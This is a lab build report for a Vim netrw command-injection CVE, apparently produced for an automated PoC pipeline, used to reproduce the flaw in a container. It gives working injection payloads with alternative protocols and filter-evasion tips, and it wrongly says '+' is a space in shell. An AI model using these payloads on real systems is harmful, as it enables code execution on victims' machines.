# Lab Build Report: CVE-2026-28417

## CVE ID
CVE-2026-28417

## Lab Architecture

**Type:** Single container (no network services needed)

This is a client-side vulnerability in Vim's netrw plugin triggered by opening a crafted URI. No databases, web servers, or other services are required. The lab consists of a single container running Vim v9.2.0072 (vulnerable) built from source.

### Container Topology

```
┌─────────────────────────────────────────┐
│  cve-2026-28417-vulnerable              │
│  ┌───────────────────────────────────┐  │
│  │ Vim 9.2 (patches 1-72)           │  │
│  │ netrw plugin (vulnerable)         │  │
│  │ openssh-client (required by netrw)│  │
│  │ Debian bookworm-slim base         │  │
│  └───────────────────────────────────┘  │
│  Networks: lab-net                      │
└─────────────────────────────────────────┘
```

## Container Details

### cve-2026-28417-vulnerable
| Property | Value |
|----------|-------|
| **Container Name** | `cve-2026-28417-vulnerable` |
| **Image** | `lab-vulnerable` (built from `Dockerfile.vulnerable`) |
| **Base Image** | `debian:bookworm-slim` (multi-stage build) |
| **Networks** | `lab-net` |
| **Ports** | None (no network services) |
| **Volumes** | None |
| **CMD** | `sleep infinity` |
| **Working Dir** | `/workspace` |

### Software Installed
- **Vim 9.2** (patches 1-72, i.e., v9.2.0072) — built from source at tag `v9.2.0072`
- **netrw plugin** — at `/usr/local/share/vim/vim92/pack/dist/opt/netrw/autoload/netrw.vim`
- **openssh-client** — required by netrw (netrw checks for `ssh`/`scp` on PATH and refuses to construct remote commands without them)
- **libncurses6, libtinfo6** — terminal library for Vim runtime

### Build Configuration
```bash
# Vim build flags (in Dockerfile)
./configure --with-features=normal --disable-gui --without-x --prefix=/usr/local
make -j$(nproc)
make install DESTDIR=/vim-install
```

## Build Status

| Component | Status | Notes |
|-----------|--------|-------|
| Dockerfile.vulnerable | ✅ Built | Multi-stage build, ~45s build time |
| docker-compose.yml | ✅ Running | Single service, no dependencies |
| Vim binary | ✅ Working | v9.2.0072 (patches 1-72) |
| netrw plugin | ✅ Present | Vulnerable `s:NetrwValidateHostname()` confirmed |
| openssh-client | ✅ Installed | Required for netrw to construct SSH commands |

### Workarounds Applied
- **openssh-client installed**: netrw requires `ssh`/`scp` executables on PATH. Without them, `g:netrw_list_cmd` is empty and netrw refuses to construct remote commands, preventing the vulnerability from triggering. The SSH client doesn't need to successfully connect — the command injection occurs during shell command construction, before any network connection.

## Start/Stop Commands

```bash
# Start the lab
docker compose up -d

# Stop the lab
docker compose down

# Rebuild (after Dockerfile changes)
docker compose build --no-cache
docker compose up -d --force-recreate
```

## Verification

### Vulnerability Confirmed ✅

The vulnerability was successfully triggered inside the container:

```
[+] ========================================
[+] VULNERABLE - Command injection confirmed
[+] ========================================
[+] Marker file: /workspace/CVE-2026-28417-PROOF
[+] Contents (output of injected 'id' command):
    uid=0(root) gid=0(root) groups=0(root)
```

### Verification Command
```bash
docker exec cve-2026-28417-vulnerable /workspace/test_vuln.sh
```

### Manual Verification
```bash
# Clean up
docker exec cve-2026-28417-vulnerable rm -f /workspace/PWNED

# Trigger: inject 'id' command via netrw hostname
docker exec cve-2026-28417-vulnerable bash -c '
cd /workspace && rm -f PWNED
timeout 15 vim --clean \
    -c "packadd netrw" \
    -c "e scp://a;id>PWNED;b/dir/" \
    -c "qa!" \
    </dev/null >/dev/null 2>&1 || true
cat PWNED 2>/dev/null && echo "VULNERABLE" || echo "NOT VULNERABLE"
'
```

### How the Exploit Works

**Payload:** `scp://a;id>PWNED;b/dir/`

1. **netrw URL parsing** extracts hostname `a;id>PWNED;b` (regex `[^/#:]` allows `;`, `>`)
2. **Hostname validation** passes: `'^[a-z0-9]'` only checks first char `a` ✓
3. **MakeSshCmd** constructs: `ssh  a;id>PWNED;b ls -FLa` (no `shellescape()`)
4. **Shell interprets** `;` as command separator:
   - `ssh a` → fails (expected, irrelevant)
   - `id>PWNED` → **executes `id`, redirects output to file PWNED (RCE!)**
   - `b ls -FLa` → fails (expected, irrelevant)

**Key constraint:** The injected command must not contain `/` (breaks URL hostname parsing) or `#`/`:` (also terminators in the regex). The `>` redirect operator avoids needing `/` for file creation.

## Files Created

| File | Location | Description |
|------|----------|-------------|
| `Dockerfile.vulnerable` | `lab/` | Multi-stage Dockerfile building Vim v9.2.0072 |
| `docker-compose.yml` | `lab/` | Docker Compose orchestration |
| `test_vuln.sh` | `lab/` | Verification script (also copied into container at `/workspace/`) |

## Known Issues / Notes

1. **No `/` in injected commands:** The netrw URL parsing regex `[^/#:]` uses `/` as hostname terminator. Injected shell commands in the hostname field cannot contain `/`, limiting direct file creation to the working directory. Workarounds: use `>` redirect to CWD, `$(command)` substitution, or `${IFS}` for spaces.

2. **Vim terminal escape codes:** When running Vim non-interactively, it emits terminal escape sequences to stdout/stderr. These are harmless but make raw output hard to read. The test script suppresses them with `</dev/null >/dev/null 2>&1`.

3. **SSH connection timeout:** The injected SSH command (`ssh a`) tries to connect to a nonexistent host. In some environments this can hang for up to 30 seconds. The `timeout 15` wrapper prevents indefinite hangs.

4. **`--clean` flag + `packadd netrw`:** Vim's `--clean` flag loads minimal configuration without user vimrc but still supports packaged plugins. The explicit `packadd netrw` ensures the netrw plugin is loaded before the `:e` command.

## For PoC Agent

### Triggering the Vulnerability
- **Container name:** `cve-2026-28417-vulnerable`
- **Working directory:** `/workspace`
- **Vim binary:** `/usr/local/bin/vim` (v9.2.0072)
- **netrw plugin:** `/usr/local/share/vim/vim92/pack/dist/opt/netrw/autoload/netrw.vim`

### Recommended PoC Approach
```bash
# Inside the container:
cd /workspace
rm -f PWNED

# Trigger command injection
timeout 15 vim --clean \
    -c "packadd netrw" \
    -c "e scp://a;id>PWNED;b/dir/" \
    -c "qa!" \
    </dev/null >/dev/null 2>&1 || true

# Verify
test -f PWNED && echo "VULNERABLE" || echo "NOT VULNERABLE"
```

### Alternative Payloads (all confirmed to pass hostname validation)
- `scp://a;id>PWNED;b/dir/` — writes `id` output to `PWNED` (confirmed working)
- `scp://a;whoami>PWNED;b/dir/` — writes username to `PWNED`
- `scp://a;uname+-a>PWNED;b/dir/` — writes system info (`+` is space in shell)
- `sftp://a;id>PWNED;b/dir/` — same injection via SFTP protocol
- `rsync://a;id>PWNED;b/dir/` — same injection via rsync protocol

### Container Access
```bash
# Execute commands inside the container
docker exec cve-2026-28417-vulnerable <command>

# Get an interactive shell
docker exec -it cve-2026-28417-vulnerable bash

# Get container IP (for lab-net network)
docker inspect cve-2026-28417-vulnerable --format '{{(index .NetworkSettings.Networks "lab-net").IPAddress}}'
```
